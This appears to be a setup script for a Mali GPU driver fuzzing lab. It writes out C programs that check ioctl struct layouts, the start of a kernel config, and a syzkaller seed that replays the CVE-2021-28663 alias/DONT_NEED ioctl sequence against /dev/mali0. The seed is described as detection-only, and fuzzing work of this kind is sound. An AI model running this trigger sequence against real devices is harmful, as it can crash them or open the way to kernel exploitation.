CK_IOC(KBASE_IOCTL_FENCE_VALIDATE, struct kbase_ioctl_fence_validate);
CK_IOC(KBASE_IOCTL_MEM_PROFILE_ADD, struct kbase_ioctl_mem_profile_add);
CK_IOC(KBASE_IOCTL_STICKY_RESOURCE_MAP, struct kbase_ioctl_sticky_resource_map);
CK_IOC(KBASE_IOCTL_STICKY_RESOURCE_UNMAP, struct kbase_ioctl_sticky_resource_unmap);
CK_IOC(KBASE_IOCTL_SOFT_EVENT_UPDATE, struct kbase_ioctl_soft_event_update);
CK_IOC(KBASE_IOCTL_GET_CPU_GPU_TIMEINFO, union kbase_ioctl_get_cpu_gpu_timeinfo);
CK_IOC(KBASE_IOCTL_KINSTR_JM_FD, union kbase_kinstr_jm_fd);
CK_IOC(KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO, struct kbase_ioctl_kinstr_prfcnt_enum_info);
CK_IOC(KBASE_IOCTL_KINSTR_PRFCNT_SETUP, union kbase_ioctl_kinstr_prfcnt_setup);
CK_IOC(KBASE_IOCTL_CONTEXT_PRIORITY_CHECK, struct kbase_ioctl_context_priority_check);
CK_IOC(KBASE_IOCTL_SET_LIMITED_CORE_COUNT, struct kbase_ioctl_set_limited_core_count);

#define P(T) printf("%-46s %3zu\n", #T, sizeof(T))
#define PCMD(c) printf("%-46s 0x%08x (nr=%u size=%u)\n", #c, (unsigned)(c), \
		       (unsigned)_IOC_NR(c), (unsigned)_IOC_SIZE(c))

int main(int argc, char **argv)
{
	if (argc < 2 || (strcmp(argv[1], "--dump") && strcmp(argv[1], "-dump"))) {
		printf("layout_check_r36p0: all static_asserts passed (r36p0-01eac0 JM)\n");
		return 0;
	}
	printf("== sizes ==\n");
	P(struct kbase_ioctl_version_check);
	P(struct kbase_ioctl_set_flags);
	P(struct kbase_ioctl_get_gpuprops);
	P(struct kbase_ioctl_job_submit);
	P(struct base_jd_atom_v2);
	P(union kbase_ioctl_mem_alloc);
	P(union kbase_ioctl_mem_query);
	P(struct kbase_ioctl_mem_free);
	P(struct kbase_ioctl_hwcnt_reader_setup);
	P(struct kbase_ioctl_hwcnt_values);
	P(struct kbase_ioctl_disjoint_query);
	P(struct kbase_ioctl_get_ddk_version);
	P(struct kbase_ioctl_mem_jit_init);
	P(struct kbase_ioctl_mem_jit_init_10_2);
	P(struct kbase_ioctl_mem_jit_init_11_5);
	P(struct kbase_ioctl_mem_exec_init);
	P(struct kbase_ioctl_mem_sync);
	P(union kbase_ioctl_mem_find_cpu_offset);
	P(union kbase_ioctl_mem_find_gpu_start_and_offset);
	P(struct kbase_ioctl_get_context_id);
	P(struct kbase_ioctl_tlstream_acquire);
	P(struct kbase_ioctl_mem_commit);
	P(union kbase_ioctl_mem_alias);
	P(struct base_mem_aliasing_info);
	P(union kbase_ioctl_mem_import);
	P(struct kbase_ioctl_mem_flags_change);
	P(struct kbase_ioctl_stream_create);
	P(struct kbase_ioctl_fence_validate);
	P(struct kbase_ioctl_mem_profile_add);
	P(struct kbase_ioctl_sticky_resource_map);
	P(struct kbase_ioctl_sticky_resource_unmap);
	P(struct kbase_ioctl_soft_event_update);
	P(union kbase_ioctl_get_cpu_gpu_timeinfo);
	P(union kbase_kinstr_jm_fd);
	P(struct kbase_ioctl_kinstr_prfcnt_enum_info);
	P(union kbase_ioctl_kinstr_prfcnt_setup);
	P(struct kbase_ioctl_context_priority_check);
	P(struct kbase_ioctl_set_limited_core_count);
	P(struct kbase_hwcnt_reader_metadata);
	printf("== offsets (chaining slots) ==\n");
	printf("%-46s %3zu\n", "base_jd_atom_v2.jit_id",
	       offsetof(struct base_jd_atom_v2, jit_id));
	printf("%-46s %3zu\n", "mem_alloc.out.gpu_va",
	       offsetof(union kbase_ioctl_mem_alloc, out.gpu_va));
	printf("%-46s %3zu\n", "mem_alias.out.gpu_va",
	       offsetof(union kbase_ioctl_mem_alias, out.gpu_va));
	printf("%-46s %3zu\n", "mem_import.out.gpu_va",
	       offsetof(union kbase_ioctl_mem_import, out.gpu_va));
	printf("%-46s %3zu\n", "mem_find_gpu_start_and_offset.out.start",
	       offsetof(union kbase_ioctl_mem_find_gpu_start_and_offset, out.start));
	printf("%-46s %3zu\n", "hwcnt_reader_metadata.cycles",
	       offsetof(struct kbase_hwcnt_reader_metadata, cycles));
	printf("== ioctl cmds ==\n");
	PCMD(KBASE_IOCTL_VERSION_CHECK);
	PCMD(KBASE_IOCTL_VERSION_CHECK_RESERVED);
	PCMD(KBASE_IOCTL_SET_FLAGS);
	PCMD(KBASE_IOCTL_JOB_SUBMIT);
	PCMD(KBASE_IOCTL_GET_GPUPROPS);
	PCMD(KBASE_IOCTL_MEM_ALLOC);
	PCMD(KBASE_IOCTL_MEM_QUERY);
	PCMD(KBASE_IOCTL_MEM_FREE);
	PCMD(KBASE_IOCTL_HWCNT_READER_SETUP);
	PCMD(KBASE_IOCTL_HWCNT_SET);
	PCMD(KBASE_IOCTL_DISJOINT_QUERY);
	PCMD(KBASE_IOCTL_GET_DDK_VERSION);
	PCMD(KBASE_IOCTL_MEM_JIT_INIT);
	PCMD(KBASE_IOCTL_MEM_JIT_INIT_10_2);
	PCMD(KBASE_IOCTL_MEM_JIT_INIT_11_5);
	PCMD(KBASE_IOCTL_MEM_EXEC_INIT);
	PCMD(KBASE_IOCTL_MEM_SYNC);
	PCMD(KBASE_IOCTL_MEM_FIND_CPU_OFFSET);
	PCMD(KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET);
	PCMD(KBASE_IOCTL_GET_CONTEXT_ID);
	PCMD(KBASE_IOCTL_TLSTREAM_ACQUIRE);
	PCMD(KBASE_IOCTL_TLSTREAM_FLUSH);
	PCMD(KBASE_IOCTL_MEM_COMMIT);
	PCMD(KBASE_IOCTL_MEM_ALIAS);
	PCMD(KBASE_IOCTL_MEM_IMPORT);
	PCMD(KBASE_IOCTL_MEM_FLAGS_CHANGE);
	PCMD(KBASE_IOCTL_STREAM_CREATE);
	PCMD(KBASE_IOCTL_FENCE_VALIDATE);
	PCMD(KBASE_IOCTL_MEM_PROFILE_ADD);
	PCMD(KBASE_IOCTL_STICKY_RESOURCE_MAP);
	PCMD(KBASE_IOCTL_STICKY_RESOURCE_UNMAP);
	PCMD(KBASE_IOCTL_SOFT_EVENT_UPDATE);
	PCMD(KBASE_IOCTL_GET_CPU_GPU_TIMEINFO);
	PCMD(KBASE_IOCTL_KINSTR_JM_FD);
	PCMD(KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO);
	PCMD(KBASE_IOCTL_KINSTR_PRFCNT_SETUP);
	PCMD(KBASE_IOCTL_CONTEXT_PRIORITY_CHECK);
	PCMD(KBASE_IOCTL_SET_LIMITED_CORE_COUNT);
	PCMD(KBASE_HWCNT_READER_GET_HWVER);
	PCMD(KBASE_HWCNT_READER_GET_BUFFER_SIZE);
	PCMD(KBASE_HWCNT_READER_DUMP);
	PCMD(KBASE_HWCNT_READER_CLEAR);
	PCMD(KBASE_HWCNT_READER_GET_BUFFER);
	PCMD(KBASE_HWCNT_READER_PUT_BUFFER);
	PCMD(KBASE_HWCNT_READER_SET_INTERVAL);
	PCMD(KBASE_HWCNT_READER_ENABLE_EVENT);
	PCMD(KBASE_HWCNT_READER_DISABLE_EVENT);
	PCMD(KBASE_HWCNT_READER_GET_API_VERSION);
	return 0;
}
__PL_22__
  sha256_pin "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0.c" "2731ba7b4fdd80c5e6c394cfdb1fc36c7735b942e7f16bbf3a1fa32154336b2c"

  mkdir -p "$(dirname "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0_csf.c")"
  cat > "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0_csf.c" <<'__PL_23__'
/* layout_check_r36p0_csf.c — release-layout gate for the r36p0-01eac0 CSF UAPI.
 *
 * Purpose (Phase H, MALI_MODE=csf): prove that the struct layouts encoded in
 * the lab's CSF-mode syzkaller description
 * (fuzzing/syzkaller/syzkaller-r41p0/sys/linux/dev_mali_r36p0_csf.txt) match
 * the *actual* r36p0-01eac0 headers in this directory as compiled with
 * MALI_USE_CSF=1 (the CSF dispatch branch), and that every modeled ioctl
 * carries the exact _IOC_SIZE of its release definition.
 *
 * Companion to layout_check_r36p0.c (JM mode): common structs are asserted
 * in both files; this file adds the CS_* / KCPU_* / MEM_ALLOC_EX models and
 * drops the JM-only ones (JOB_SUBMIT family).
 *
 * Build + run (host any arch; UAPI structs are arch-independent here):
 *   gcc -O2 -static -DMALI_USE_CSF=1 -I <this dir> \
 *       layout_check_r36p0_csf.c -o layout_check_r36p0_csf
 *   ./layout_check_r36p0_csf          # asserts only (compile-time gate)
 *   ./layout_check_r36p0_csf --dump   # + sizeof/offset/cmd table for evidence
 *
 * Any layout drift fails the COMPILE (static_assert), never silently.
 */
#include <stdio.h>
#include <stddef.h>
#include <string.h>

#ifndef MALI_USE_CSF
#error "MALI_USE_CSF must be 1: this checker validates the CSF-mode r36p0 UAPI only"
#endif
#if !MALI_USE_CSF
#error "MALI_USE_CSF is 0: this checker validates the CSF-mode r36p0 UAPI only"
#endif

#include <gpu/arm/midgard/mali_kbase_ioctl.h>
#include <gpu/arm/midgard/mali_base_kernel.h>
#include <gpu/arm/midgard/csf/mali_base_csf_kernel.h>
#include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>

#define CK_SIZE(T, N) \
	_Static_assert(sizeof(T) == (N), "sizeof(" #T ") != " #N " (description mismatch)")
#define CK_OFF(T, F, N) \
	_Static_assert(offsetof(T, F) == (N), "offsetof(" #T "." #F ") != " #N " (description mismatch)")
#define CK_IOC(cmd, T) \
	_Static_assert(_IOC_SIZE(cmd) == sizeof(T), "_IOC_SIZE(" #cmd ") != sizeof(" #T ")")
#define CK_IOC_SIZE0(cmd) \
	_Static_assert(_IOC_SIZE(cmd) == 0, "_IOC_SIZE(" #cmd ") != 0 (_IO cmd)")

/* ---- common (mode-shared) struct sizes expected by the description ---- */
CK_SIZE(struct kbase_ioctl_version_check, 4);
CK_SIZE(struct kbase_ioctl_set_flags, 4);
CK_SIZE(struct kbase_ioctl_get_gpuprops, 16);
CK_SIZE(union kbase_ioctl_mem_alloc, 32);
CK_SIZE(union kbase_ioctl_mem_query, 16);
CK_SIZE(struct kbase_ioctl_mem_free, 8);
CK_SIZE(struct kbase_ioctl_hwcnt_reader_setup, 20);
CK_SIZE(struct kbase_ioctl_hwcnt_values, 16);
CK_SIZE(struct kbase_ioctl_disjoint_query, 4);
CK_SIZE(struct kbase_ioctl_get_ddk_version, 16);
CK_SIZE(struct kbase_ioctl_mem_jit_init, 24);
CK_SIZE(struct kbase_ioctl_mem_jit_init_10_2, 8);   /* nr14, 8B form */
CK_SIZE(struct kbase_ioctl_mem_jit_init_11_5, 16);  /* nr14, 16B form */
CK_SIZE(struct kbase_ioctl_mem_exec_init, 8);
CK_SIZE(struct kbase_ioctl_mem_sync, 32);
CK_SIZE(union kbase_ioctl_mem_find_cpu_offset, 24);
CK_SIZE(union kbase_ioctl_mem_find_gpu_start_and_offset, 16);
CK_SIZE(struct kbase_ioctl_get_context_id, 4);
CK_SIZE(struct kbase_ioctl_tlstream_acquire, 4);
CK_SIZE(struct kbase_ioctl_mem_commit, 16);
CK_SIZE(union kbase_ioctl_mem_alias, 32);
CK_SIZE(struct base_mem_aliasing_info, 24);
CK_SIZE(union kbase_ioctl_mem_import, 24);
CK_SIZE(struct kbase_ioctl_mem_flags_change, 24);
CK_SIZE(struct kbase_ioctl_stream_create, 32);
CK_SIZE(struct kbase_ioctl_fence_validate, 4);
CK_SIZE(struct kbase_ioctl_mem_profile_add, 16);
CK_SIZE(struct kbase_ioctl_sticky_resource_map, 16);
CK_SIZE(struct kbase_ioctl_sticky_resource_unmap, 16);
CK_SIZE(union kbase_ioctl_get_cpu_gpu_timeinfo, 32);
CK_SIZE(struct kbase_ioctl_kinstr_prfcnt_enum_info, 16);
CK_SIZE(union kbase_ioctl_kinstr_prfcnt_setup, 16);
CK_SIZE(struct kbase_ioctl_context_priority_check, 1);
CK_SIZE(struct kbase_ioctl_set_limited_core_count, 1);
CK_SIZE(struct kbase_hwcnt_reader_metadata_cycles, 16);
CK_SIZE(struct kbase_hwcnt_reader_metadata, 32);
CK_SIZE(struct kbase_hwcnt_reader_api_version, 8);

/* ---- CSF-only struct sizes (csf/mali_kbase_csf_ioctl.h + csf base) ---- */
CK_SIZE(union kbase_ioctl_mem_alloc_ex, 64);
CK_SIZE(struct kbase_ioctl_cs_queue_register, 16);
CK_SIZE(struct kbase_ioctl_cs_queue_kick, 8);
CK_SIZE(union kbase_ioctl_cs_queue_bind, 16);
CK_SIZE(struct kbase_ioctl_cs_queue_register_ex, 40);
CK_SIZE(struct kbase_ioctl_cs_queue_terminate, 8);
CK_SIZE(union kbase_ioctl_cs_queue_group_create_1_6, 32);
CK_SIZE(union kbase_ioctl_cs_queue_group_create, 40);
CK_SIZE(struct kbase_ioctl_cs_queue_group_term, 8);
CK_SIZE(struct kbase_ioctl_kcpu_queue_new, 8);
CK_SIZE(struct kbase_ioctl_kcpu_queue_delete, 8);
CK_SIZE(struct kbase_ioctl_kcpu_queue_enqueue, 16);
CK_SIZE(struct base_kcpu_command, 24);
CK_SIZE(union kbase_ioctl_cs_tiler_heap_init, 16);
CK_SIZE(struct kbase_ioctl_cs_tiler_heap_term, 8);
CK_SIZE(union kbase_ioctl_cs_get_glb_iface, 24);
CK_SIZE(struct kbase_ioctl_cs_cpu_queue_info, 16);

/* size-encoded variants share an nr; the size bits select the generation. */
#define CK_IOC_OFF(cmd, T, M) \
	_Static_assert(_IOC_SIZE(cmd) == offsetof(T, M), "cmd size != offsetof(" #T "." #M ")")
CK_IOC_OFF(KBASE_HWCNT_READER_GET_BUFFER, struct kbase_hwcnt_reader_metadata, cycles);
CK_IOC(KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES, struct kbase_hwcnt_reader_metadata);
CK_IOC_OFF(KBASE_HWCNT_READER_PUT_BUFFER, struct kbase_hwcnt_reader_metadata, cycles);
CK_IOC(KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES, struct kbase_hwcnt_reader_metadata);
CK_IOC(KBASE_HWCNT_READER_GET_API_VERSION, __u32);
CK_IOC(KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES, struct kbase_hwcnt_reader_api_version);

/* ---- union-share slots used for gpu_addr chaining / in-view modeling ---- */
CK_OFF(union kbase_ioctl_mem_alloc, out.gpu_va, 8);   /* desc models gpu_addr at @8 */
CK_OFF(union kbase_ioctl_mem_alloc_ex, out.gpu_va, 8);/* desc models gpu_addr at @8 */
CK_OFF(union kbase_ioctl_mem_alias, out.gpu_va, 8);
CK_OFF(union kbase_ioctl_mem_import, out.gpu_va, 8);
CK_OFF(union kbase_ioctl_mem_find_gpu_start_and_offset, out.start, 0);
CK_OFF(union kbase_ioctl_get_cpu_gpu_timeinfo, in.paddings, 4);
CK_OFF(struct kbase_hwcnt_reader_metadata, cycles, 16);
CK_OFF(union kbase_ioctl_cs_queue_bind, out.mmap_handle, 0); /* aliased, ignored */
CK_OFF(union kbase_ioctl_cs_queue_group_create_1_6, out.group_handle, 0);
CK_OFF(union kbase_ioctl_cs_tiler_heap_init, out.gpu_heap_va, 0);
CK_OFF(union kbase_ioctl_cs_get_glb_iface, out.glb_version, 0);
CK_OFF(struct base_kcpu_command, info, 8);            /* type(1) + pad(7) */

/* ---- every cmd's encoded size must equal the modeled struct ---- */
CK_IOC(KBASE_IOCTL_VERSION_CHECK, struct kbase_ioctl_version_check);
CK_IOC(KBASE_IOCTL_VERSION_CHECK_RESERVED, struct kbase_ioctl_version_check);
CK_IOC(KBASE_IOCTL_SET_FLAGS, struct kbase_ioctl_set_flags);
CK_IOC(KBASE_IOCTL_GET_GPUPROPS, struct kbase_ioctl_get_gpuprops);
CK_IOC(KBASE_IOCTL_MEM_ALLOC, union kbase_ioctl_mem_alloc);
CK_IOC(KBASE_IOCTL_MEM_ALLOC_EX, union kbase_ioctl_mem_alloc_ex);
CK_IOC(KBASE_IOCTL_MEM_QUERY, union kbase_ioctl_mem_query);
CK_IOC(KBASE_IOCTL_MEM_FREE, struct kbase_ioctl_mem_free);
CK_IOC(KBASE_IOCTL_HWCNT_READER_SETUP, struct kbase_ioctl_hwcnt_reader_setup);
CK_IOC(KBASE_IOCTL_HWCNT_SET, struct kbase_ioctl_hwcnt_values);
CK_IOC(KBASE_IOCTL_DISJOINT_QUERY, struct kbase_ioctl_disjoint_query);
CK_IOC(KBASE_IOCTL_GET_DDK_VERSION, struct kbase_ioctl_get_ddk_version);
CK_IOC(KBASE_IOCTL_MEM_JIT_INIT, struct kbase_ioctl_mem_jit_init);
CK_IOC(KBASE_IOCTL_MEM_JIT_INIT_10_2, struct kbase_ioctl_mem_jit_init_10_2);
CK_IOC(KBASE_IOCTL_MEM_JIT_INIT_11_5, struct kbase_ioctl_mem_jit_init_11_5);
CK_IOC(KBASE_IOCTL_MEM_EXEC_INIT, struct kbase_ioctl_mem_exec_init);
CK_IOC(KBASE_IOCTL_MEM_SYNC, struct kbase_ioctl_mem_sync);
CK_IOC(KBASE_IOCTL_MEM_FIND_CPU_OFFSET, union kbase_ioctl_mem_find_cpu_offset);
CK_IOC(KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET,
       union kbase_ioctl_mem_find_gpu_start_and_offset);
CK_IOC(KBASE_IOCTL_GET_CONTEXT_ID, struct kbase_ioctl_get_context_id);
CK_IOC(KBASE_IOCTL_TLSTREAM_ACQUIRE, struct kbase_ioctl_tlstream_acquire);
CK_IOC(KBASE_IOCTL_MEM_COMMIT, struct kbase_ioctl_mem_commit);
CK_IOC(KBASE_IOCTL_MEM_ALIAS, union kbase_ioctl_mem_alias);
CK_IOC(KBASE_IOCTL_MEM_IMPORT, union kbase_ioctl_mem_import);
CK_IOC(KBASE_IOCTL_MEM_FLAGS_CHANGE, struct kbase_ioctl_mem_flags_change);
CK_IOC(KBASE_IOCTL_STREAM_CREATE, struct kbase_ioctl_stream_create);
CK_IOC(KBASE_IOCTL_FENCE_VALIDATE, struct kbase_ioctl_fence_validate);
CK_IOC(KBASE_IOCTL_MEM_PROFILE_ADD, struct kbase_ioctl_mem_profile_add);
CK_IOC(KBASE_IOCTL_STICKY_RESOURCE_MAP, struct kbase_ioctl_sticky_resource_map);
CK_IOC(KBASE_IOCTL_STICKY_RESOURCE_UNMAP, struct kbase_ioctl_sticky_resource_unmap);
CK_IOC(KBASE_IOCTL_GET_CPU_GPU_TIMEINFO, union kbase_ioctl_get_cpu_gpu_timeinfo);
CK_IOC(KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO, struct kbase_ioctl_kinstr_prfcnt_enum_info);
CK_IOC(KBASE_IOCTL_KINSTR_PRFCNT_SETUP, union kbase_ioctl_kinstr_prfcnt_setup);
CK_IOC(KBASE_IOCTL_CONTEXT_PRIORITY_CHECK, struct kbase_ioctl_context_priority_check);
CK_IOC(KBASE_IOCTL_SET_LIMITED_CORE_COUNT, struct kbase_ioctl_set_limited_core_count);
/* CSF dispatch cases */
CK_IOC(KBASE_IOCTL_CS_QUEUE_REGISTER, struct kbase_ioctl_cs_queue_register);
CK_IOC(KBASE_IOCTL_CS_QUEUE_KICK, struct kbase_ioctl_cs_queue_kick);
CK_IOC(KBASE_IOCTL_CS_QUEUE_BIND, union kbase_ioctl_cs_queue_bind);
CK_IOC(KBASE_IOCTL_CS_QUEUE_REGISTER_EX, struct kbase_ioctl_cs_queue_register_ex);
CK_IOC(KBASE_IOCTL_CS_QUEUE_TERMINATE, struct kbase_ioctl_cs_queue_terminate);
CK_IOC(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6, union kbase_ioctl_cs_queue_group_create_1_6);
CK_IOC(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE, union kbase_ioctl_cs_queue_group_create);
CK_IOC(KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE, struct kbase_ioctl_cs_queue_group_term);
CK_IOC_SIZE0(KBASE_IOCTL_CS_EVENT_SIGNAL);
CK_IOC(KBASE_IOCTL_KCPU_QUEUE_CREATE, struct kbase_ioctl_kcpu_queue_new);
CK_IOC(KBASE_IOCTL_KCPU_QUEUE_DELETE, struct kbase_ioctl_kcpu_queue_delete);
CK_IOC(KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, struct kbase_ioctl_kcpu_queue_enqueue);
CK_IOC(KBASE_IOCTL_CS_TILER_HEAP_INIT, union kbase_ioctl_cs_tiler_heap_init);
CK_IOC(KBASE_IOCTL_CS_TILER_HEAP_TERM, struct kbase_ioctl_cs_tiler_heap_term);
CK_IOC(KBASE_IOCTL_CS_GET_GLB_IFACE, union kbase_ioctl_cs_get_glb_iface);
CK_IOC(KBASE_IOCTL_CS_CPU_QUEUE_DUMP, struct kbase_ioctl_cs_cpu_queue_info);

#define P(T) printf("%-46s %3zu\n", #T, sizeof(T))
#define PCMD(c) printf("%-46s 0x%08x (nr=%u size=%u)\n", #c, (unsigned)(c), \
		       (unsigned)_IOC_NR(c), (unsigned)_IOC_SIZE(c))

int main(int argc, char **argv)
{
	if (argc < 2 || (strcmp(argv[1], "--dump") && strcmp(argv[1], "-dump"))) {
		printf("layout_check_r36p0_csf: all static_asserts passed (r36p0-01eac0 CSF)\n");
		return 0;
	}
	printf("== sizes ==\n");
	P(struct kbase_ioctl_version_check);
	P(union kbase_ioctl_mem_alloc);
	P(union kbase_ioctl_mem_alloc_ex);
	P(struct kbase_ioctl_cs_queue_register);
	P(struct kbase_ioctl_cs_queue_register_ex);
	P(union kbase_ioctl_cs_queue_bind);
	P(union kbase_ioctl_cs_queue_group_create_1_6);
	P(union kbase_ioctl_cs_queue_group_create);
	P(struct kbase_ioctl_kcpu_queue_new);
	P(struct kbase_ioctl_kcpu_queue_enqueue);
	P(struct base_kcpu_command);
	P(union kbase_ioctl_cs_tiler_heap_init);
	P(union kbase_ioctl_cs_get_glb_iface);
	P(struct kbase_ioctl_cs_cpu_queue_info);
	P(struct kbase_hwcnt_reader_metadata);
	printf("== offsets (chaining slots) ==\n");
	printf("%-46s %3zu\n", "mem_alloc.out.gpu_va",
	       offsetof(union kbase_ioctl_mem_alloc, out.gpu_va));
	printf("%-46s %3zu\n", "mem_alloc_ex.out.gpu_va",
	       offsetof(union kbase_ioctl_mem_alloc_ex, out.gpu_va));
	printf("%-46s %3zu\n", "base_kcpu_command.info",
	       offsetof(struct base_kcpu_command, info));
	printf("== ioctl cmds ==\n");
	PCMD(KBASE_IOCTL_VERSION_CHECK);
	PCMD(KBASE_IOCTL_VERSION_CHECK_RESERVED);
	PCMD(KBASE_IOCTL_MEM_ALLOC);
	PCMD(KBASE_IOCTL_MEM_ALLOC_EX);
	PCMD(KBASE_IOCTL_CS_QUEUE_REGISTER);
	PCMD(KBASE_IOCTL_CS_QUEUE_KICK);
	PCMD(KBASE_IOCTL_CS_QUEUE_BIND);
	PCMD(KBASE_IOCTL_CS_QUEUE_REGISTER_EX);
	PCMD(KBASE_IOCTL_CS_QUEUE_TERMINATE);
	PCMD(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6);
	PCMD(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE);
	PCMD(KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE);
	PCMD(KBASE_IOCTL_CS_EVENT_SIGNAL);
	PCMD(KBASE_IOCTL_KCPU_QUEUE_CREATE);
	PCMD(KBASE_IOCTL_KCPU_QUEUE_DELETE);
	PCMD(KBASE_IOCTL_KCPU_QUEUE_ENQUEUE);
	PCMD(KBASE_IOCTL_CS_TILER_HEAP_INIT);
	PCMD(KBASE_IOCTL_CS_TILER_HEAP_TERM);
	PCMD(KBASE_IOCTL_CS_GET_GLB_IFACE);
	PCMD(KBASE_IOCTL_CS_CPU_QUEUE_DUMP);
	return 0;
}
__PL_23__
  sha256_pin "$LAB_ROOT/harness/release_uapi/r36p0/layout_check_r36p0_csf.c" "fbd0d50a7c5661f0022a8f366ded76a8e1707b5b0b9ab9fba0b60eed33e60357"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/progs/seed_alias_dontneed_r28p0.syz")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/progs/seed_alias_dontneed_r28p0.syz" <<'__PL_24__'
# Seed: CVE-2021-28663 sequence on r28p0 (detection-only; no privilege escalation).
# open /dev/mali0 -> UK handshake -> SET_FLAGS -> tracking mmap -> MEM_ALLOC (SAME_VA)
# -> mmap source (cookie = byte offset) -> MEM_ALIAS (nents=1, stride=PAGES) ->
# MEM_FLAGS_CHANGE(DONT_NEED) on the source with a live alias -> MEM_FREE.
# Purpose: give the fuzzer a foothold in the alias/flags_change lifetime state machine
# (the vulnerable window). No payload, no pointer reads — mutation only.
# CMD LITERALS MUST EQUAL sys/linux/dev_mali_r28p0.txt.const (syz parses written
# literals verbatim even for const[...] cmd fields): seed v1 shipped with wrong
# VERSION_CHECK (0x80048000 vs 0xc0048000) and MEM_FREE (0x40088006 vs 0x40088007)
# — the incomplete UK handshake then gated every later kbase ioctl out (replay
# coverage showed handlers never entered). Fixed to const-exact values.
r0 = openat$mali(0xffffffffffffff9c, &(0x7f0000000000)='/dev/mali0\x00', 0x2, 0x0)
ioctl$KBASE_IOCTL_VERSION_CHECK(r0, 0xc0048000, &(0x7f0000000100)={0xb, 0x1d})
ioctl$KBASE_IOCTL_SET_FLAGS(r0, 0x40048001, &(0x7f0000000140)={0x0})
r1 = mmap$bifrost(0x0, 0x1000, 0x1, 0x1, r0, 0x3000)
r2 = ioctl$KBASE_IOCTL_MEM_ALLOC(r0, 0xc0208005, &(0x7f0000000180)={0x10, 0x10, 0x0, 0x200f})
r3 = mmap$bifrost(0x0, 0x10000, 0x3, 0x1, r0, r2)
r4 = ioctl$KBASE_IOCTL_MEM_ALIAS(r0, 0xc0208015, &(0x7f0000000200)={0xd, 0x10, 0x1, &(0x7f0000000240)=[{r3, 0x0, 0x10}]})
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(r0, 0x40188017, &(0x7f0000000300)={r3, 0x20000, 0x20000})
ioctl$KBASE_IOCTL_MEM_FREE(r0, 0x40088007, &(0x7f0000000340)={r3})
__PL_24__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/progs/seed_alias_dontneed_r28p0.syz" "980c7ef00fb5d9ecdaf3ec22104fa82d4c7fff7b67fc8e731de256f284ccde65"

  mkdir -p "$(dirname "$LAB_ROOT/configs/lab_fuzz.config")"
  cat > "$LAB_ROOT/configs/lab_fuzz.config" <<'__PL_25__'
#
# Automatically generated file; DO NOT EDIT.
# Linux/x86 4.19.320 Kernel Configuration
#

#
# Compiler: gcc (Ubuntu 15.2.0-16ubuntu1) 15.2.0
#
CONFIG_CC_IS_GCC=y
CONFIG_GCC_VERSION=150200
CONFIG_CLANG_VERSION=0
CONFIG_CC_HAS_ASM_GOTO=y
CONFIG_CONSTRUCTORS=y
CONFIG_IRQ_WORK=y
CONFIG_BUILDTIME_EXTABLE_SORT=y
CONFIG_THREAD_INFO_IN_TASK=y

#
# General setup
#
CONFIG_INIT_ENV_ARG_LIMIT=32
# CONFIG_COMPILE_TEST is not set
CONFIG_LOCALVERSION=""
# CONFIG_LOCALVERSION_AUTO is not set
CONFIG_BUILD_SALT=""
CONFIG_HAVE_KERNEL_GZIP=y
CONFIG_HAVE_KERNEL_BZIP2=y
CONFIG_HAVE_KERNEL_LZMA=y
CONFIG_HAVE_KERNEL_XZ=y
CONFIG_HAVE_KERNEL_LZO=y
CONFIG_HAVE_KERNEL_LZ4=y
CONFIG_KERNEL_GZIP=y
# CONFIG_KERNEL_BZIP2 is not set
# CONFIG_KERNEL_LZMA is not set
# CONFIG_KERNEL_XZ is not set
# CONFIG_KERNEL_LZO is not set
# CONFIG_KERNEL_LZ4 is not set
CONFIG_DEFAULT_HOSTNAME="(none)"
CONFIG_SWAP=y
CONFIG_SYSVIPC=y
CONFIG_SYSVIPC_SYSCTL=y
CONFIG_POSIX_MQUEUE=y
CONFIG_POSIX_MQUEUE_SYSCTL=y
CONFIG_CROSS_MEMORY_ATTACH=y
CONFIG_USELIB=y
CONFIG_AUDIT=y
CONFIG_HAVE_ARCH_AUDITSYSCALL=y
CONFIG_AUDITSYSCALL=y
CONFIG_AUDIT_WATCH=y
CONFIG_AUDIT_TREE=y

#
# IRQ subsystem
#
CONFIG_GENERIC_IRQ_PROBE=y
CONFIG_GENERIC_IRQ_SHOW=y
CONFIG_GENERIC_IRQ_EFFECTIVE_AFF_MASK=y
CONFIG_GENERIC_PENDING_IRQ=y
CONFIG_GENERIC_IRQ_MIGRATION=y
CONFIG_IRQ_DOMAIN=y
CONFIG_IRQ_DOMAIN_HIERARCHY=y
CONFIG_GENERIC_MSI_IRQ=y
CONFIG_GENERIC_MSI_IRQ_DOMAIN=y
CONFIG_GENERIC_IRQ_MATRIX_ALLOCATOR=y
CONFIG_GENERIC_IRQ_RESERVATION_MODE=y
CONFIG_IRQ_FORCED_THREADING=y
CONFIG_SPARSE_IRQ=y
# CONFIG_GENERIC_IRQ_DEBUGFS is not set
CONFIG_CLOCKSOURCE_WATCHDOG=y
CONFIG_ARCH_CLOCKSOURCE_DATA=y
CONFIG_CLOCKSOURCE_VALIDATE_LAST_CYCLE=y
CONFIG_GENERIC_TIME_VSYSCALL=y
CONFIG_GENERIC_CLOCKEVENTS=y
CONFIG_GENERIC_CLOCKEVENTS_BROADCAST=y
CONFIG_GENERIC_CLOCKEVENTS_MIN_ADJUST=y
CONFIG_GENERIC_CMOS_UPDATE=y

#
# Timers subsystem
#
CONFIG_TICK_ONESHOT=y
